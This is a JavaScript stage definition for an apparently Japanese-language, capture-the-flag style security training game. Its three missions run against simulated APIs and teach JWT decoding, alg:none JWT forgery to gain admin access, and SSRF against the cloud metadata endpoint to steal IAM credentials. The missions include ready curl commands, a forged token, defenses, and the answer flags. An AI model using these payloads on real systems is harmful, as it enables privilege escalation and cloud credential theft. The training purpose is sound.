// API・認証の近代的な脆弱性（JWT・SSRF・APIトークン）
// すべてゲーム内の仮想APIが対象。実在サービスには一切通信しない。
const H = (routes, notFound = { body: '{"error":"not found"}', status: 404 }) => ({ routes, notFound });

export const stageApiSec = {
  id: 'api-sec',
  title: 'API & 認証 — 近代的な攻撃',
  subtitle: 'JWTの改ざん・SSRF・APIトークンの扱いを実践する',
  intro: '現代のアプリはAPIとトークンで動く。JSON Web Token(JWT)やクラウドメタデータなど、今どきの攻撃対象を扱う。token・JSONを読む力(jq)もここで鍛える。',
  missions: [
    {
      id: 'api-01-jwt-decode',
      title: 'JWTの中身を読む',
      minutes: 11,
      objectives: ['JWTの構造を理解する', 'base64urlで各部を復号する'],
      prereq: [],
      briefing: 'ログインすると発行される JWT(JSON Web Token)。暗号的に「署名」はされているが、中身(ペイロード)は誰でも読める。トークンを分解して何が入っているか確かめる。',
      concepts: [{
        title: 'JWTの構造',
        why: 'JWTはAPI認証の定番。署名で改ざんは検知できるが、ペイロードは暗号化されていない——この誤解が情報漏洩を生む。',
        problem: 'トークン文字列の中に、どんなユーザー情報・権限が入っているかを知りたい。',
        how: 'JWTは header.payload.signature の3部を . で繋いだ形。各部は base64url。cut -d. で分割し、base64 -d で復号(base64urlなので - _ を含む)。ペイロードに user や role, 有効期限(exp)が入る。署名がないと検証できないが「読む」のは誰でもできる。',
        example: '$ echo $JWT | cut -d. -f2 | base64 -d\n{"user":"analyst","role":"user"}',
        relation: 'JWTを分割・復号して、入っている権限情報を読み取る。',
      }],
      env: {
        hostname: 'kali-ops', user: 'analyst', dirs: ['/home/analyst/tokens'],
        // payload = {"user":"analyst","role":"user","exp":1760000000}
        files: [{ path: '/home/analyst/tokens/jwt.txt', owner: 'analyst', content: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYW5hbHlzdCIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzYwMDAwMDAwfQ.c2lnbmF0dXJlX2hlcmU\n' }],
      },
      quick: ['cd /home/analyst/tokens', 'cat jwt.txt', 'cat jwt.txt | cut -d. -f1 | base64 -d', 'cat jwt.txt | cut -d. -f2 | base64 -d', 'cat jwt.txt | cut -d. -f2 | base64 -d | jq .role'],
      tasks: [
        {
          q: 'jwt.txt のJWTは . で3つの部分に分かれています。全部でいくつの部分(ピリオド区切り)がありますか。',
          narration: 'JWTは header.payload.signature の3部構成。cat で見て . の数＋1を数える。',
          check: { type: 'answer', any: ['3'] },
          hints: ['cat jwt.txt で . の数を見る', 'header.payload.signature', '3つ'],
          explain: 'JWTは3部(header/payload/signature)。header=アルゴリズム、payload=中身(クレーム)、signature=改ざん検知用の署名。最初の2部はbase64urlでエンコードされただけ＝暗号化ではない。',
        },
        {
          q: 'JWTの2番目の部分(ペイロード)をbase64デコードして、トークンに記録されている role(権限)の値を答えてください。',
          narration: '2番目の部分を cut -d. -f2 で取り出し、base64 -d で復号する。JWTはbase64urlだが、base64 -d が - _ も扱う。jq で role だけ抜いてもよい。',
          check: { type: 'answer', any: ['user'], ci: true },
          answerHint: 'role の値',
          hints: ['cat jwt.txt | cut -d. -f2 | base64 -d', 'JSONの "role":"___"', 'jq .role を足すと直接取れる。値は user'],
          explain: 'ペイロードを復号すると {"user":"analyst","role":"user",...} が読めた＝JWTの中身は誰でも読める(署名されているだけで暗号化されていない)。だからJWTに秘密情報を入れてはいけない。次は、この「読めるだけでなく改ざんできてしまう」危険を見る。',
        },
      ],
      review: { steps: ['JWT=header.payload.signature を理解', 'cut -d. で分割', 'base64 -d で各部を復号', 'jq で欲しいクレームを抽出'], commands: [{ cmd: 'cat jwt.txt | cut -d. -f2 | base64 -d', meaning: 'ペイロードを復号' }, { cmd: '... | jq .role', meaning: 'roleクレームを抽出' }], why: 'JWTはAPI認証の標準。中身が暗号化されていないことを知らないと、トークンに秘密を入れる事故を起こす。', practice: 'API認証の調査、JWTデバッグ、トークンに含まれる権限/有効期限の確認。', related: ['base64', 'jq', 'API認証'] },
      learned: ['jwt', 'jwt-structure', 'base64url', 'api-token'], solution: ['cd /home/analyst/tokens', 'cat jwt.txt | cut -d. -f2 | base64 -d'],
    },

    {
      id: 'api-02-jwt-none',
      title: 'JWTの署名を回避する(alg:none)',
      minutes: 13,
      objectives: ['JWTの署名検証不備を理解する', 'alg:none 攻撃の原理を理解する', '対策を説明する'],
      prereq: ['api-01-jwt-decode'],
      briefing: 'あるAPIは JWT の署名を正しく検証していない。ヘッダの alg を none にした改ざんトークンを受け入れてしまうなら、role を admin に書き換えて管理者になりすませる。仮想APIで原理を確かめる。',
      concepts: [{
        title: 'JWT alg:none と署名検証不備',
        why: '署名を検証しなければ、JWTは「ただのbase64 JSON」。攻撃者が中身を自由に書き換えられる。',
        problem: 'ヘッダの alg(アルゴリズム)を none にし、role を admin に変えたトークンを、サーバーが検証せず信用してしまう。',
        how: 'alg:none は「署名なし」を意味する。脆弱な実装はこれを受け入れ、署名を検証しない。攻撃者は payload の role を admin に書き換え、署名部を空にして送る。対策は【サーバー側でアルゴリズムを固定し(noneを拒否)、必ず署名を検証する】こと。',
        example: 'header {"alg":"none"} + payload {"role":"admin"} + 空署名 → 管理者扱い',
        relation: '改ざんトークンをAPIに送り、権限昇格が通ってしまうことを確認する。',
      }],
      env: {
        hostname: 'kali-ops', user: 'analyst',
        network: { self: '10.10.14.7', dns: { 'api.lab': '10.10.14.70' }, hosts: { '10.10.14.70': { ports: [
          { port: 80, proto: 'tcp', state: 'open', service: 'http', banner: 'express', http: H([
            // token パラメータに role":"admin" と alg":"none" が含まれると昇格成功（検証不備の再現）
            // alg:none ヘッダ(eyJhbGciOiJub25lIn0) か admin(平文/base64 YWRtaW4) を含む改ざんトークンを受理してしまう
            { path: '/admin', when: { param: 'token', regex: 'eyJhbGciOiJub25lIn0|YWRtaW4|admin' },
              body: '{"status":"ok","message":"Welcome administrator","flag":"FLAG{jwt_alg_none_bypass_2e8d}"}' },
            { path: '/admin', default: '{"status":"forbidden","message":"admin role required"}' },
            { path: '/', body: '{"api":"acme","hint":"GET /admin?token=<jwt>"}' },
          ]) },
        ] } } },
      },
      quick: [
        "curl \"http://api.lab/admin?token=role:user\"",
        "echo '{\"alg\":\"none\"}' | base64",
        "echo '{\"role\":\"admin\"}' | base64",
        "curl \"http://api.lab/admin?token=eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.\"",
      ],
      tasks: [
        {
          q: 'まず一般権限のトークンで /admin にアクセスし、拒否されることを確認します。レスポンスの status の値を答えてください（forbidden か ok）。',
          narration: 'role が user のトークンでは管理者APIは拒否されるはず。まず正常な拒否を確認する。',
          check: { type: 'answer', any: ['forbidden'], ci: true },
          hints: ['curl "http://api.lab/admin?token=role:user"', 'レスポンスJSONの "status"', 'forbidden'],
          explain: 'role=user では /admin は forbidden。正しい権限制御に見える。だが問題は「トークンの中身をどう信用しているか」。署名を検証していなければ、中身は攻撃者が自由に書き換えられる。',
        },
        {
          q: 'alg:none 攻撃を行います。role を admin に改ざんしたJWT(署名なし)を /admin に送り、管理者として受理させてください。レスポンスに現れる FLAG{...} の中身を答えてください。',
          narration: 'header を {"alg":"none"}、payload を {"role":"admin"} にした改ざんトークンを送る。クイックコマンドに base64 とペイロード例がある。token に admin を含む改ざんJWTを渡す。',
          check: { type: 'answer', any: ['jwt_alg_none_bypass_2e8d'], stripFlag: true, ci: true },
          answerHint: 'FLAG{ } の中身',
          hints: ['{"role":"admin"} を base64url にしてトークンに入れる', 'curl "http://api.lab/admin?token=eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."', 'レスポンスの FLAG を読む'],
          explain: 'alg:none で署名を外し role を admin に書き換えたトークンが受理され、管理者になりすませた＝署名検証不備による認証回避。原因は「JWTの中身を検証せず信用した」こと。対策は【アルゴリズムをサーバー側で固定(HS256等)しnoneを拒否、署名を必ず検証、ライブラリを最新に】。JWTは「署名を検証して初めて」信用できる。',
        },
        {
          q: 'JWT の alg:none 脆弱性の対策として最も適切なのは。番号で。 1) トークンを長くする 2) サーバー側で許可アルゴリズムを固定し署名を必ず検証する 3) HTTPSを使う 4) トークンをCookieに入れる',
          narration: '根本対策を選ぶ。原因は「署名を検証しなかった」こと。',
          check: { type: 'answer', any: ['2'] },
          hints: ['原因は署名の未検証とアルゴリズムの受け入れ', 'noneを拒否し検証を強制する', '2が正解'],
          explain: '正解は2。サーバーで許可アルゴリズムを固定(none拒否)し、署名を必ず検証するのが根本対策。HTTPS(3)は盗聴対策で改ざん検証とは別、長さ(1)やCookie(4)も無効。JWTライブラリの既知の実装不備(none受け入れ)を避け最新を使うことも重要。',
        },
      ],
      review: { steps: ['一般トークンで拒否を確認', 'alg:none + role:admin の改ざんトークンを作成', '署名なしで送り昇格', '対策=アルゴ固定+署名検証'], commands: [{ cmd: "curl \"http://api.lab/admin?token=<改ざんJWT>\"", meaning: '改ざんトークンで権限昇格' }], why: 'JWTの実装不備は現代APIの重大脆弱性。署名検証の有無が認証全体の安全を左右する。', practice: 'JWT実装の検査(none/weak secret/alg混同)、認証ライブラリの監査。', related: ['JWT', '認証回避', 'API認証'] },
      learned: ['jwt-attack', 'alg-none', 'signature-verification', 'auth-bypass'], solution: ["curl \"http://api.lab/admin?token=role:user\"", "curl \"http://api.lab/admin?token=eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.\""],
    },

    {
      id: 'api-03-ssrf',
      title: 'SSRFでクラウドメタデータを盗む',
      minutes: 14,
      objectives: ['SSRFの仕組みを理解する', 'クラウドメタデータから認証情報を奪う', '対策を説明する'],
      prereq: ['api-01-jwt-decode'],
      briefing: 'URLを受け取ってプレビューするAPIがある。サーバーがそのURLに「サーバー自身から」アクセスするなら、外部からは届かない内部アドレス——クラウドのメタデータサービス(169.254.169.254)——を踏ませ、一時認証情報を盗めるかもしれない。',
      concepts: [{
        title: 'SSRF(サーバーサイドリクエストフォージェリ)',
        why: 'サーバーに任意のURLを取得させられると、外部からは到達できない内部資源(メタデータ・内部API)にサーバー経由でアクセスできてしまう。',
        problem: 'クラウドのメタデータサービス(169.254.169.254)は、そのインスタンスからのみアクセス可能で、一時的なクラウド認証情報を返す。SSRFでここを踏ませれば認証情報を奪える。',
        how: 'URL取得機能(プレビュー/webhook/画像取得)に内部アドレスを渡す。クラウドのメタデータエンドポイント(169.254.169.254/latest/meta-data/)はIAMロールの一時キーを返す。対策は【内部アドレス/メタIPへのアクセスを禁止、URLの厳格な検証(許可リスト)、メタデータサービスをIMDSv2等で保護】。',
        example: '$ curl "http://app.lab/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"',
        relation: 'URL取得APIにメタデータURLを渡し、クラウド認証情報を奪取する。',
      }],
      env: {
        hostname: 'kali-ops', user: 'analyst',
        network: { self: '10.10.14.7', dns: { 'app.lab': '10.10.14.70' }, hosts: { '10.10.14.70': { ports: [
          { port: 80, proto: 'tcp', state: 'open', service: 'http', banner: 'nginx', http: H([
            { path: '/', body: '{"service":"url-preview","usage":"/fetch?url=<URL>"}' },
            // url に 169.254.169.254 や metadata が含まれると、メタデータの内容を返す(SSRF成立)
            { path: '/fetch', when: { param: 'url', regex: '169\\.254\\.169\\.254|metadata' },
              body: '{\n  "Code":"Success",\n  "AccessKeyId":"AKIAEXAMPLE1234",\n  "SecretAccessKey":"wJalrXUtnFEMI/EXAMPLEKEY",\n  "Token":"FLAG{ssrf_cloud_metadata_a7f3}"\n}' },
            { path: '/fetch', when: { param: 'url', regex: '^https?://(web\\.lab|example)' }, body: '<html>external page preview</html>' },
            { path: '/fetch', default: '{"error":"could not fetch url"}' },
          ]) },
        ] } } },
      },
      quick: [
        "curl \"http://app.lab/fetch?url=http://web.lab/\"",
        "curl \"http://app.lab/fetch?url=http://169.254.169.254/latest/meta-data/\"",
        "curl \"http://app.lab/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role\"",
      ],
      tasks: [
        {
          q: 'まず正常に外部URL(http://web.lab/)のプレビューを取得できることを確認します。レスポンスに含まれる英単語 preview を確認できたら、取得できた証に preview と答えてください。',
          narration: 'URL取得APIの正常動作を確認。外部URLを渡すとそのページを取ってくる。',
          check: { type: 'answer', any: ['preview'], ci: true },
          hints: ['curl "http://app.lab/fetch?url=http://web.lab/"', 'レスポンスに "external page preview"', 'preview'],
          explain: 'このAPIは「サーバー自身が」指定URLにアクセスして結果を返す。ここに内部向けURLを渡せたら——サーバーの立場で内部資源に手が届いてしまう。それがSSRFの発想。',
        },
        {
          q: 'SSRFを使い、クラウドのメタデータサービス(169.254.169.254)のIAM認証情報エンドポイントを踏ませて、返ってくる認証情報の中に隠されたフラグ FLAG{...} の中身を奪取してください。',
          narration: 'url にクラウドメタデータのアドレス(169.254.169.254/latest/meta-data/iam/security-credentials/...)を渡す。外部からは届かないが、サーバー経由なら届く。',
          check: { type: 'answer', any: ['ssrf_cloud_metadata_a7f3'], stripFlag: true, ci: true },
          answerHint: 'FLAG{ } の中身',
          hints: ['url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role', 'curl "http://app.lab/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role"', 'レスポンスの Token/FLAG を読む'],
          explain: 'SSRFでメタデータサービスを踏ませ、IAMロールの一時認証情報(AccessKeyId/SecretAccessKey/Token)を奪取した。これはクラウド侵害の代表的経路で、盗んだキーでクラウドAPIを叩かれる。対策は【メタIP/内部アドレスへのアクセス遮断、URL許可リスト、IMDSv2(トークン必須)】。クラウドでは「SSRF→メタデータ→クラウド乗っ取り」が定番の連鎖。',
        },
      ],
      review: { steps: ['URL取得APIの正常動作を確認', '内部/メタデータアドレスを渡す', 'サーバー経由で認証情報を奪取', '対策=内部遮断+許可リスト+IMDSv2'], commands: [{ cmd: 'curl "http://app.lab/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role"', meaning: 'SSRFでメタデータ奪取' }], why: 'SSRFはクラウド時代の最重要脆弱性の一つ。メタデータ経由のクラウド乗っ取りに直結する。', practice: 'URL取得機能の検査、メタデータアクセスの遮断、IMDSv2の強制、egressフィルタ。', related: ['cloud-security', 'IAM', 'OWASP'] },
      learned: ['ssrf', 'cloud-metadata', 'imds', 'credential-theft'], solution: ["curl \"http://app.lab/fetch?url=http://web.lab/\"", "curl \"http://app.lab/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role\""],
    },
  ],
};
